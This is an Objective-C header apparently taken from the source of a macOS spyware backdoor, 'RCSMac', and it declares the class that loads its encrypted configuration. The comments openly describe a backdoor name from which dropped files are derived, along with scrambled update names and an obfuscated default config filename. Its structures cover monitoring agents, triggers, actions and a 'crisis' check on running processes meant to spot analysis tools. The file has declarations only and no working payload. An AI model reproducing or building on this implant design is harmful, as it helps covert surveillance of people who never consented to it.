/*
 * RCSMac - ConfiguraTor(i)
 *  This class will be responsible for all the required operations on the 
 *  configuration file
 *
 * Ported in Objective-C from Mornella
 *
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMConfigManager_h__
#define __RCSMConfigManager_h__

#import "NSString+SHA1.h"
#import "RCSMEncryption.h"
#import "RCSMCommon.h"

typedef struct _agent {
  u_int   agentID;
  u_int   status;  // Running, Stopped
  u_int   internalDataSize;
  //void *pParams;
  NSData  *internalData;
  void    *pFunc;        // Thread start routine
  u_int   command;
} agentStruct;

typedef struct _event {
  u_int   type;
  u_int   actionID;
  u_int   internalDataSize;
  NSData  *internalData;
  void    *pFunc;
  u_int   status;
  u_int   command;     // Used for communicate within the monitor
} eventStruct;

typedef struct _action {
  u_int   type;
  u_int   internalDataSize;
  NSData  *internalData;
} actionStruct;

typedef struct _actionContainer {
  u_int numberOfSubActions;
} actionContainerStruct;

typedef struct {
  UInt32  unused;
  UInt32  check_network;
  UInt32  check_system;
  UInt32  network_process_count;
  UInt32  system_process_count;
  char    process_names[1];
} crisisConfStruct;

//
// Only used if there's no other name to use
//
#define DEFAULT_CONF_NAME    @"PWR84nQ0C54WR.Y8n"

@interface __m_MConfManager : NSObject
{
@private
  // Configuration Filename derived from the scrambled backdoor name
  //NSString *mConfigurationName;
  
  // Backdoor update name (backdoorName scrambleForward: ALPHABET_LEN / 2)
  //NSString *mBackdoorUpdateName;
  
  // Backdoor binary name - all the dropped files are derived from this string
  //NSString *mBackdoorName;
  // Configuration Data
  NSData *mConfigurationData;
  
@private
  __m_MEncryption *mEncryption;
}

- (id)initWithBackdoorName: (NSString *)aName;
- (void)dealloc;

//
// @author
//  revenge
// @abstract
//  This function will parse and fill all the required objects with the
//  configuration values.
// @return
//  FALSE if an error occurred otherwise TRUE.
//
- (BOOL)loadConfiguration;
- (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile;

- (__m_MEncryption *)encryption;

@end

#endif